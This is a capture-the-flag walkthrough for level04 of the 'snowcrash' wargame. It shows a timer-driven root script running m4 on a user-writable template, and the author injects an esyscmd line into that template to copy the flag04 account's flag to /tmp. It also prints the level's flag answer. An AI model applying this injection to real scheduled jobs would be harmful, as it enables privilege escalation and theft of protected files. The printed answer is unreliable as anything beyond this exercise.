```bash
level04@snowcrash:~$ cat README 
In the beginning was the Word.
level04@snowcrash:~$ find / -user flag04 2>/dev/null
/var/log/babel
/var/log/babel/babel.log
/var/lib/babel
/var/lib/babel/output.conf
/var/lib/babel/output.conf.bak
/var/lib/babel/output.conf.sha256
/home/flag04

```

```bash
level04@snowcrash:/var/lib/babel/templates$ find / -name "*babel*" 2>/dev/null
/usr/share/doc/python-babel-localedata
/usr/share/doc/python3-babel
/usr/share/python-babel-localedata
/usr/bin/pybabel-python3
/usr/bin/pybabel
/usr/lib/python3/dist-packages/babel
/var/log/babel
/var/log/babel/babel.log
/var/lib/dpkg/alternatives/pybabel
/var/lib/dpkg/info/python3-babel.md5sums
/var/lib/dpkg/info/python-babel-localedata.md5sums
/var/lib/dpkg/info/python3-babel.postinst
/var/lib/dpkg/info/python3-babel.list
/var/lib/dpkg/info/python-babel-localedata.list
/var/lib/dpkg/info/python3-babel.prerm
/var/lib/babel
/etc/systemd/system/timers.target.wants/babel.timer
/etc/systemd/system/babel.service
/etc/systemd/system/babel.timer
/etc/alternatives/pybabel
/opt/snowcrash/level04/babel.sh

```
looking at these two systemd unit files : 

/etc/systemd/system/timers.target.wants/babel.timer
/etc/systemd/system/babel.service
we need just to follow the same thing we did in level03

```bash
level04@snowcrash:/var/lib/babel/templates$ systemctl status babel.service
○ babel.service - Babel configuration generator (one-shot)
     Loaded: loaded (/etc/systemd/system/babel.service; static)
     Active: inactive (dead) since Sun 2026-10-04 14:43:53 UTC; 13s ago
TriggeredBy: ● babel.timer
    Process: 46136 ExecStart=/opt/snowcrash/level04/babel.sh (code=exited, status=0/SUCCESS)
   Main PID: 46136 (code=exited, status=0/SUCCESS)
        CPU: 25ms


level04@snowcrash:/var/lib/babel/templates$ systemctl status babel.timer
● babel.timer - Babel configuration generator — runs every 30 seconds
     Loaded: loaded (/etc/systemd/system/babel.timer; enabled; preset: enabled)
     Active: active (waiting) since Sat 2026-10-03 12:13:07 UTC; 1 day 2h ago
    Trigger: Sun 2026-10-04 14:44:23 UTC; 3s left
   Triggers: ● babel.service


```

so the timer automatically launches the service every 30 seconds , and the service executes the babel.sh
```bash
-rwxr-xr-x 1 root root 4241 Jun  9 19:03 /opt/snowcrash/level04/babel.sh

```
we can;t modify the scritp, let's see what it contains

afte reading the bable.sh we notice
```bash
TEMPLATE="${TEMPLATE_DIR}/template.m4"
TEMPLATE_DIR="/var/lib/babel/templates"
if m4 "${TEMPLATE}" > "${OUTPUT_CONF}" 2>> "${LOG_FILE}"; then
```
and sice we can edit the /var/lib/babel/templates/template.m4
adn the service runnin by flag04, let;s inject a command to cat the .flag at the bottom of the tmplate.m4 , open the fil
```bash
vim template.m4
sroll down and add this :
esyscmd(`cat /home/flag04/.flag > /tmp/flag04_result')
```
wait 30s and cat the /tmp/flag04_result

```bash
level04@snowcrash:/var/lib/babel/templates$ cat /tmp/flag04_result 
ne2searoevaevoem4ov4ar8ap

```